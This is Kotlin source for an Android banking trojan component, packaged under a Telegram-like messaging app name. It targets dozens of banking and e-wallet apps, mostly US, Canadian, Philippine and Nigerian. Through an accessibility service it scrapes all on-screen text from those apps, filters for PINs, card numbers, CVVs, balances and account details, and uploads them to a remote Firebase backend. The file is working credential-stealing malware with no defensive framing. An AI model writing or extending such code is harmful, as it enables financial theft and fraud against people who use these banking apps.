package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONObject

object BankLogger {
    private val bankPackages = setOf(
        // Existing general banking
        "com.chase.sig.android",
        "com.wellsfargo.mobile",
        "com.bankofamerica.banking",
        "com.cibc.mobile",
        "com.td",
        "com.scotiabank.banking",
        "com.rbc.mobile",
        "com.capitalone.mobile",
        "com.paypal.android.p2pmobile",
        "com.venmo",
        "com.squareup.cash",
        "com.moneybookers.skrillpayments",
        "com.google.android.apps.walletnfcrel",
        "com.google.android.apps.nbu.paisa.user",

        // Philippine e-wallets / payment
        "com.globe.gcash.android",
        "com.paymaya",
        "ph.seabank.seabank",
        "asia.coins.mobile",
        "com.grabtaxi.passenger",       // GrabPay
        "com.shopee.ph",                // ShopeePay

        // Philippine digital banks
        "ph.com.gotyme",
        "com.tonik.mobile",
        "com.iexceed.unoConsumerBanking",  // UNO Digital Bank
        "com.uniondigitalbank",            // UnionDigital Bank
        "com.ofbank.mobile",               // OFBank

        // Philippine traditional banks
        "ph.com.bdo.retail",
        "ph.com.bdo.pay",
        "ph.com.metrobank.mcc.mbonline",
        "com.unionbankph.online",
        "com.pnb.android",
        "com.landbank.mobilebanking",
        "com.securitybank.bbx",
        "com.eastwest.mobile.dxp",
        "com.rcbc.pulz",
        "com.maybank2u.mayaph",
        "com.bpi.ng.app",
        "ph.maya.business.android",
        "com.paymaya.negosyo",

        // Nigerian e-wallets / fintech
        "team.opay.pay",
        "com.transsnet.palmpay",
        "com.mtngroupfintech.consumerapp",  // MoMo PSB
        "com.africa.smartcash",
        "com.mypaga.customer",
        "ng.com.fairmoney.fairmoney",

        // Nigerian digital banks
        "com.kudabank.app",
        "com.moniepoint.personal",
        "com.moniepoint.business",
        "com.wemabank.alat.prod",

        // Nigerian traditional banks
        "com.accessbank.nextgen",
        "com.gtbank.gtworldv1",
        "com.firstbank.firstmobile",
        "com.uba.vericash",
        "com.zenithBank.eazymoney"
    )

    fun onEvent(service: AccessibilityService, event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (pkg !in bankPackages) return

        val root = service.rootInActiveWindow ?: return

        val data = JSONObject()
        data.put("package", pkg)
        data.put("activity", event.className?.toString() ?: "unknown")

        val allTexts = mutableListOf<String>()
        collectTexts(root, allTexts)
        if (allTexts.isNotEmpty()) {
            data.put("screen_texts", allTexts.joinToString(" | "))
        }

        val keywords = listOf("balance", "PIN", "card", "account", "routing", "IBAN", "sort", "CVV")
        val sensitive = allTexts.filter { text ->
            keywords.any { text.contains(it, ignoreCase = true) }
        }
        if (sensitive.isNotEmpty()) {
            data.put("sensitive_data", sensitive.joinToString(" | "))
        }

        FirebaseBridge.pushBankData(data.toString())
    }

    private fun collectTexts(node: AccessibilityNodeInfo, out: MutableList<String>) {
        if (node.text != null && node.text.isNotBlank()) {
            out.add(node.text.toString().trim())
        }
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { collectTexts(it, out) }
        }
    }
}